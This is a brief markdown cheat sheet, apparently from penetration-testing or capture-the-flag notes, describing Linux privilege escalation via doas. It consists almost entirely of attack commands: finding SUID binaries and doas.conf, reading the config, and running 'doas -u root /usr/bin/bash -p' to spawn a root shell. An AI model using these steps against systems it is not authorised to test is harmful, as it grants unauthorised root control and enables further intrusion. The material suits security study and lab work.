# Doas SUID privilege escalation

## Requirements: doas has SUID bit set

### Doas has similar functionality as sudo, which means you can run binaries with elevated privileges by using doas

## STEPS

#### 1) Check for unusual SUID binaries

    find / -type f -perm 4000 2>/dev/null

#### 2) Search for the doas configuration file

    find / -type f -name "doas.conf" 2>/dev/null 

#### 3) Check which binary can be run using doas with elevated privileges

    cat /path/to/doas.conf 

#### 4) Runs bash using doas as root

    doas -u root /usr/bin/bash -p 
